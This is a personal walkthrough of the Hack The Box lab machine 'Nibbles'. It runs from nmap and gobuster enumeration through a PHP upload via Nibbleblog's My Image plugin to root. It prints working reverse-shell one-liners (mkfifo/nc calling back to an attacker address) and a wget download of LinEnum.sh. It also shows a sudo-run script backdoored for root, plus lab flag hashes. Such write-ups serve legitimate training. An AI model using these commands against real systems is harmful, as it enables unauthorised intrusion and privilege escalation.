Current Target: 10.129.116.32
    Machine Name	Nibbles
    Creator	mrb3n
    Operating System	Linux
    Difficulty	Easy
    User Path	Web
    Privilege Escalation	World-writable File / Sudoers Misconfiguration
    Ippsec Video	https://www.youtube.com/watch?v=s_0GcRGv6Ds
    Walkthrough	https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html

Basic Enumeration
    nmap -sV --open -oA nibbles_initial_scan 10.129.116.32
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 08:20 CST
        Nmap scan report for 10.129.116.32
        Host is up (0.12s latency).
        Not shown: 998 closed tcp ports (reset)
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds
    
    nmap -p- --open -oA nibbles_full_tcp_scan 10.129.116.32
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 08:24 CST
        Nmap scan report for 10.129.116.32
        Host is up (0.12s latency).
        Not shown: 65008 closed tcp ports (reset), 525 filtered tcp ports (no-response)
        Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
        PORT   STATE SERVICE
        22/tcp open  ssh
        80/tcp open  http

        Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds
    
    nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.116.32
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 08:28 CST
        Nmap scan report for 10.129.116.32
        Host is up (0.12s latency).

        PORT   STATE SERVICE
        22/tcp open  ssh
        | ssh-hostkey: 
        |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
        |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
        |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
        80/tcp open  http
        |_http-title: Site doesn't have a title (text/html).

        Nmap done: 1 IP address (1 host up) scanned in 4.44 seconds

    nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.116.32
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 08:29 CST
        Nmap scan report for 10.129.116.32
        Host is up (0.12s latency).
        Not shown: 998 closed tcp ports (reset)
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
        |_http-server-header: Apache/2.4.18 (Ubuntu)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds

    nc -nv 10.129.116.32 22
        (UNKNOWN) [10.129.116.32] 22 (ssh) open
        SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2

    nc -nv 10.129.116.32 80
        (UNKNOWN) [10.129.116.32] 80 (http) open

    whatweb 10.129.116.32
        http://10.129.116.32 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.116.32]

    curl http://10.129.116.32
        <b>Hello world!</b>

        <!-- /nibbleblog/ directory. Nothing interesting here! -->

    whatweb http://10.129.116.32/nibbleblog
        http://10.129.116.32/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.116.32], RedirectLocation[http://10.129.116.32/nibbleblog/], Title[301 Moved Permanently]
        http://10.129.116.32/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.116.32], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

    gobuster dir -u http://10.129.116.32/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
        ===============================================================
        Gobuster v3.6
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        [+] Url:                     http://10.129.116.32/nibbleblog/
        [+] Method:                  GET
        [+] Threads:                 10
        [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
        [+] Negative Status codes:   404
        [+] User Agent:              gobuster/3.6
        [+] Timeout:                 10s
        ===============================================================
        Starting gobuster in directory enumeration mode
        ===============================================================
        /.hta                 (Status: 403) [Size: 303]
        /.htaccess            (Status: 403) [Size: 308]
        /.htpasswd            (Status: 403) [Size: 308]
        /README               (Status: 200) [Size: 4628]
        /admin                (Status: 301) [Size: 325] [--> http://10.129.116.32/nibbleblog/admin/]
        /admin.php            (Status: 200) [Size: 1401]
        /content              (Status: 301) [Size: 327] [--> http://10.129.116.32/nibbleblog/content/]
        /index.php            (Status: 200) [Size: 2987]
        /languages            (Status: 301) [Size: 329] [--> http://10.129.116.32/nibbleblog/languages/]
        /plugins              (Status: 301) [Size: 327] [--> http://10.129.116.32/nibbleblog/plugins/]
        /themes               (Status: 301) [Size: 326] [--> http://10.129.116.32/nibbleblog/themes/]
        Progress: 4723 / 4724 (99.98%)
        ===============================================================
        Finished
        ===============================================================
    
    curl http://10.129.116.32/nibbleblog/README
        ====== Nibbleblog ======
        Version: v4.0.3
        Codename: Coffee
        Release date: 2014-04-01

    wget -m http://10.129.116.32/nibbleblog/
        Web Contents downloaded locally

    Browsing with firefox shows directory listing is enabled
        Found the following file: http://10.129.116.32/nibbleblog/content/private/users.xml

    curl -s http://10.129.116.32/nibbleblog/content/private/config.xml | xmllint --format -
        <?xml version="1.0" encoding="utf-8" standalone="yes"?>
        <config>
            <name type="string">Nibbles</name>
            <slogan type="string">Yum yum</slogan>
            <footer type="string">Powered by Nibbleblog</footer>
            <advanced_post_options type="integer">0</advanced_post_options>
            <url type="string">http://10.10.10.134/nibbleblog/</url>
            <path type="string">/nibbleblog/</path>
            <items_rss type="integer">4</items_rss>
            <items_page type="integer">6</items_page>
            <language type="string">en_US</language>
            <timezone type="string">UTC</timezone>
            <timestamp_format type="string">%d %B, %Y</timestamp_format>
            <locale type="string">en_US</locale>
            <img_resize type="integer">1</img_resize>
            <img_resize_width type="integer">1000</img_resize_width>
            <img_resize_height type="integer">600</img_resize_height>
            <img_resize_quality type="integer">100</img_resize_quality>
            <img_resize_option type="string">auto</img_resize_option>
            <img_thumbnail type="integer">1</img_thumbnail>
            <img_thumbnail_width type="integer">190</img_thumbnail_width>
            <img_thumbnail_height type="integer">190</img_thumbnail_height>
            <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
            <img_thumbnail_option type="string">landscape</img_thumbnail_option>
            <theme type="string">simpler</theme>
            <notification_comments type="integer">1</notification_comments>
            <notification_session_fail type="integer">0</notification_session_fail>
            <notification_session_start type="integer">0</notification_session_start>
            <notification_email_to type="string">admin@nibbles.com</notification_email_to>
            <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
            <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
            <seo_site_description type="string"/>
            <seo_keywords type="string"/>
            <seo_robots type="string"/>
            <seo_google_code type="string"/>
            <seo_bing_code type="string"/>
            <seo_author type="string"/>
            <friendly_urls type="integer">0</friendly_urls>
            <default_homepage type="integer">0</default_homepage>
        </config>

    ./cewl.rb http://10.129.116.32/nibbleblog/
        CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
        Nibbles
        Yum
        yum
        Hello
        world
        posts
        Home
        Uncategorised
        Music
        Videos
        HEADER
        MAIN
        PLUGINS
        Categories
        Latest
        image
        Pages
        VIEW
        There
        are
        FOOTER
        Atom
        Top
        Powered
        Nibbleblog
        ATOM
        Feed
        http
        nibbleblog
        feed
        php

    Determined admin credentials were:
        admin:nibbles

    Found My Image plugin available via admin login
        Uploaded test php file with code execution to see if code uploads were available.

    curl http://10.129.116.32/nibbleblog/content/private/plugins/my_image/image.php
        uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

    Uploaded reverse shell script
        <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.237 9443 >/tmp/f"); ?>

    Reverse shell worked, upgraded to bash via python
        python3 -c 'import pty; pty.spawn("/bin/bash")'

    Browsed filesystem looking for flag.  found in /home/nibbler/user.txt
        79c03865431abf47b90ef24b9695e148

    Unzipped personal.zip to see about privilege Escalation
        found monitoring script (monitor.sh)

    LinEnum.sh attack
        Downloaded LinEnum.sh to local Machine and started local web server via 
            sudo python3 -m http.server 8080
        Sent to target host via 
            wget http://10.10.14.237:8080/LinEnum.sh
        Executed on Target host
            user can run monitor script as root without password

    Monitor.sh
        added root based reverse shell to monitor script
            echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.237 8443 >/tmp/f' | tee -a monitor.sh
        
        started new listener for root access
            nc -lvnp 8443

        executed monitor script as root with reverse shell
            sudo /home/nibbler/personal/stuff/monitor.sh
        
        found root flag: /root/root.txt
            de5e5d6619862a8aa5b9b212314e0cdd
